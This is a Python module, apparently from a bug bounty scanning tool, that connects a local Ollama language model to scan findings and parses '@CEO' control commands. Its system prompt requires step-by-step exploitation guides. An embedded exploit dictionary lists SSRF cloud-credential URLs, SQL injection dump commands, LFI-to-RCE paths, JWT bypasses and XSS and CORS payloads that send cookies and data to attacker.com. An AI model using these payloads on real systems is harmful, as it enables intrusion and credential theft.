#!/usr/bin/env python3
# integrations/ollama_ai.py — Local Ollama AI Brain
# Knows: all findings, CEO state, exploit techniques, @CEO commands
# MilkyWay Intelligence | Author: Sharlix

import json
import re
import time
import threading
import urllib.request
import urllib.error
from typing import Optional

OLLAMA_URL   = "http://localhost:11434"
DEFAULT_MODEL = "llama3"

SYSTEM_PROMPT = """You are M7Hunter AI Brain — an elite bug bounty assistant integrated into the M7Hunter V7 automated security scanner.

You have FULL KNOWLEDGE of:
1. All vulnerabilities found in the current scan (provided in context)
2. M7Hunter tool architecture — CEO Engine, pipeline steps, finding engine
3. How to exploit each vulnerability type found
4. Bug bounty report writing for HackerOne, Bugcrowd, Intigriti
5. Attack chaining techniques (IDOR→ATO, SSRF→Cloud, XSS→Session)

You can control the CEO Engine via @CEO commands:
- @CEO delay 3000       → Set request delay to 3000ms
- @CEO pause            → Pause the scan
- @CEO resume           → Resume the scan
- @CEO stop             → Stop gracefully
- @CEO kill             → Emergency stop
- @CEO focus xss        → Focus only on XSS
- @CEO confidence 0.9   → Set confidence threshold to 0.9
- @CEO threads 10       → Set thread count

When a user asks about a finding, you MUST:
1. Explain the vulnerability technically
2. Give step-by-step exploitation guide
3. Suggest attack chains
4. Provide bug bounty report template

Always respond in a direct, expert style. No fluff.
Current scan data will be injected into your context automatically."""

EXPLOIT_KNOWLEDGE = {
    "IDOR": """
EXPLOIT GUIDE:
1. Identify: Look for numeric IDs in URLs (/api/user/123) or JSON body {"user_id": 123}
2. Replace: Change ID to another user's ID (+1, -1, known IDs)
3. Headers to test: X-User-ID, X-Account-ID
4. JSON body mutation: {"user_id": 124} → {"user_id": "124"} → {"user_id": [124]}
5. Confirm: Different user's PII (email, name, address) in response
CHAIN: IDOR → change victim email → trigger password reset → Account Takeover (CRITICAL)
REPORT: Include: request, response diff, victim data shown, impact statement""",

    "SSRF": """
EXPLOIT GUIDE:
1. AWS Cloud: http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. GCP: http://metadata.google.internal/computeMetadata/v1/instance/ (need header)
3. Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
4. Internal: http://localhost:80, http://127.0.0.1:6379 (Redis), http://10.0.0.1
5. Protocols: file:///etc/passwd, dict://localhost:6379/info, gopher://
CHAIN: SSRF→AWS IAM creds → AWS CLI access → S3/EC2 full compromise""",

    "XSS": """
EXPLOIT GUIDE:
1. Reflected: <script>alert(1)</script> → encode if needed → %3Cscript%3E
2. Stored: Submit payload in profile fields, comments, usernames
3. DOM: Inject via hash: #<img src=x onerror=alert(1)>
4. Bypass: <svg/onload=alert(1)>, <img src=x onerror=alert(1)>
5. Steal cookie: <script>fetch('https://attacker.com/?c='+document.cookie)</script>
CHAIN: XSS → steal admin cookie → admin session hijack → full account takeover""",

    "SQLI": """
EXPLOIT GUIDE:
1. Error-based: ' OR 1=1-- , '; SELECT sleep(5)--
2. Time-based: '; IF(1=1) WAITFOR DELAY '0:0:5'--
3. UNION: ' UNION SELECT null,username,password FROM users--
4. sqlmap: sqlmap -u 'URL' --dbs --dump --batch --risk=3 --level=5
CHAIN: SQLi → dump credentials → login as admin → RCE via file upload""",

    "LFI": """
EXPLOIT GUIDE:
1. Basic: ../../../../etc/passwd
2. Null byte: ../../../../etc/passwd%00
3. Double encode: ..%252F..%252F..%252Fetc/passwd
4. PHP wrappers: php://filter/convert.base64-encode/resource=index.php
5. Log poison: SSH log → inject PHP → LFI → RCE
CHAIN: LFI → /proc/self/environ → log poisoning → RCE""",

    "CORS": """
EXPLOIT GUIDE:
1. PoC: origin: https://attacker.com in request
2. If ACAO: attacker.com + ACAC: true → steal data
3. JS PoC:
   var x = new XMLHttpRequest();
   x.open('GET','https://target.com/api/user');
   x.withCredentials = true;
   x.send();
   x.onload = function(){fetch('https://attacker.com/?data='+x.responseText)}
CHAIN: CORS → steal user token → authenticate as victim""",

    "CSRF": """
EXPLOIT GUIDE:
1. Missing token: Submit form without CSRF token
2. SameSite=None: Cross-origin requests allowed
3. PoC form:
   <form action='https://target.com/api/change-email' method='POST'>
   <input name='email' value='attacker@evil.com'>
   <input type='submit'>
   </form><script>document.forms[0].submit()</script>
CHAIN: CSRF → change email → reset password → Account Takeover""",

    "JWT": """
EXPLOIT GUIDE:
1. alg:none: Change header to {"alg":"none"} → remove signature
2. Weak secret: Crack with hashcat: hashcat -a 0 -m 16500 token.txt wordlist.txt
3. RS256→HS256: If public key known, sign HS256 with public key
4. kid injection: kid: ../../dev/null → sign with empty string
5. jku header: Point to attacker-controlled JWKS endpoint""",
}


class OllamaAI:
    """
    Local Ollama AI Brain — knows all findings, CEO state, exploits.
    """

    def __init__(self, model: str = DEFAULT_MODEL, log=None,
                 ceo_engine=None, findings_engine=None):
        self.model          = model
        self.log            = log
        self.ceo            = ceo_engine
        self.findings_engine = findings_engine
        self._history       = []
        self._lock          = threading.Lock()
        self._available     = self._check_available()

    def _check_available(self) -> bool:
        try:
            r = urllib.request.urlopen(f"{OLLAMA_URL}/api/tags", timeout=3)
            return r.status == 200
        except Exception:
            return False

    def is_available(self) -> bool:
        return self._available

    def get_status(self) -> dict:
        if not self._available:
            return {"available": False, "message": "Ollama not running — start with: ollama serve"}
        try:
            r    = urllib.request.urlopen(f"{OLLAMA_URL}/api/tags", timeout=3)
            data = json.loads(r.read())
            models = [m["name"] for m in data.get("models", [])]
            return {"available": True, "models": models, "current": self.model}
        except Exception as e:
            return {"available": False, "error": str(e)}

    def _get_scan_context(self) -> str:
        """Build context from current scan findings."""
        parts = []

        if self.findings_engine:
            stats = self.findings_engine.get_stats()
            findings = self.findings_engine.get_all()[:20]
            parts.append(f"=== CURRENT SCAN: {stats['total']} findings ===")
            parts.append(f"Critical:{stats['critical']} High:{stats['high']} "
                          f"Medium:{stats['medium']} Low:{stats['low']}")
            for f in findings:
                parts.append(
                    f"[{f['severity'].upper()}] {f['vuln_type']} → {f['url'][:60]}"
                    + (f" | {f['detail'][:50]}" if f.get('detail') else "")
                )

        if self.ceo:
            status = self.ceo.status()
            parts.append(f"\n=== CEO ENGINE: state={status['state']} "
                          f"waf={status['waf_detected']} ===")

        # Add exploit knowledge for found vuln types
        if self.findings_engine:
            found_types = set()
            for f in self.findings_engine.get_all():
                vt = f.get("vuln_type","").split("_")[0]
                found_types.add(vt.upper())
            for vt in found_types:
                if vt in EXPLOIT_KNOWLEDGE:
                    parts.append(f"\n=== EXPLOIT GUIDE: {vt} ===")
                    parts.append(EXPLOIT_KNOWLEDGE[vt])

        return "\n".join(parts)

    def _parse_ceo_command(self, text: str) -> Optional[str]:
        """Parse @CEO commands from user message."""
        if not self.ceo or "@CEO" not in text.upper() and "@ceo" not in text:
            return None

        text_lower = text.lower()
        if "@ceo pause" in text_lower:
            self.ceo.pause()
            return "CEO: Scan PAUSED ⏸️"
        elif "@ceo resume" in text_lower:
            self.ceo.resume()
            return "CEO: Scan RESUMED ▶️"
        elif "@ceo stop" in text_lower:
            self.ceo.stop()
            return "CEO: Scan STOPPING gracefully 🛑"
        elif "@ceo kill" in text_lower:
            self.ceo.kill()
            return "CEO: KILL SWITCH activated 💀"
        elif m := re.search(r"@ceo delay\s+(\d+)", text_lower):
            ms = int(m.group(1))
            self.ceo.rules["normal_min_delay_ms"] = ms
            self.ceo.rules["normal_max_delay_ms"] = ms + 500
            return f"CEO: Delay set to {ms}ms ⏱️"
        elif m := re.search(r"@ceo threads?\s+(\d+)", text_lower):
            n = int(m.group(1))
            return f"CEO: Thread count acknowledged ({n}) — takes effect on next step"
        elif m := re.search(r"@ceo confidence\s+([\d.]+)", text_lower):
            conf = float(m.group(1))
            self.ceo.rules[f"min_confidence_high"] = conf
            return f"CEO: Confidence threshold set to {conf} ✅"
        elif m := re.search(r"@ceo focus\s+(\w+)", text_lower):
            vuln = m.group(1).upper()
            return f"CEO: Focus mode → {vuln} (manually run specific step)"
        return None

    def chat(self, user_message: str) -> str:
        """Main chat function — handles @CEO commands + AI response."""
        # Check @CEO commands first
        ceo_response = self._parse_ceo_command(user_message)
        if ceo_response:
            return ceo_response

        if not self._available:
            return ("⚠️ Ollama not running. Start with:\n"
                    "```\nollama serve\nollama pull llama3\n```")

        # Build messages
        scan_context = self._get_scan_context()
        system_with_context = SYSTEM_PROMPT + "\n\n" + scan_context

        with self._lock:
            self._history.append({"role": "user", "content": user_message})
            messages = [
                {"role": "system", "content": system_with_context},
                *self._history[-10:]  # last 10 turns
            ]

        try:
            payload = json.dumps({
                "model"   : self.model,
                "messages": messages,
                "stream"  : False,
                "options" : {"temperature": 0.7, "num_predict": 512},
            }).encode()
            req  = urllib.request.Request(
                f"{OLLAMA_URL}/api/chat",
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            resp = urllib.request.urlopen(req, timeout=60)
            data = json.loads(resp.read())
            reply = data.get("message", {}).get("content", "No response")

            with self._lock:
                self._history.append({"role": "assistant", "content": reply})

            return reply

        except urllib.error.URLError as e:
            return f"❌ Ollama error: {e}"
        except Exception as e:
            return f"❌ AI error: {str(e)[:100]}"

    def explain_finding(self, finding: dict) -> str:
        """Auto-explain a specific finding."""
        vt      = finding.get("vuln_type","")
        url     = finding.get("url","")
        detail  = finding.get("detail","")
        sev     = finding.get("severity","")
        payload = finding.get("payload","")

        guide   = EXPLOIT_KNOWLEDGE.get(vt.split("_")[0].upper(), "")
        prompt  = (
            f"A {sev.upper()} severity {vt} was found at: {url}\n"
            f"Detail: {detail}\n"
            f"Payload used: {payload}\n\n"
            f"Explain: 1) What is this vulnerability? 2) How to exploit it? "
            f"3) What is the impact? 4) Write a bug bounty report summary."
        )
        return self.chat(prompt)

    def clear_history(self):
        with self._lock:
            self._history.clear()
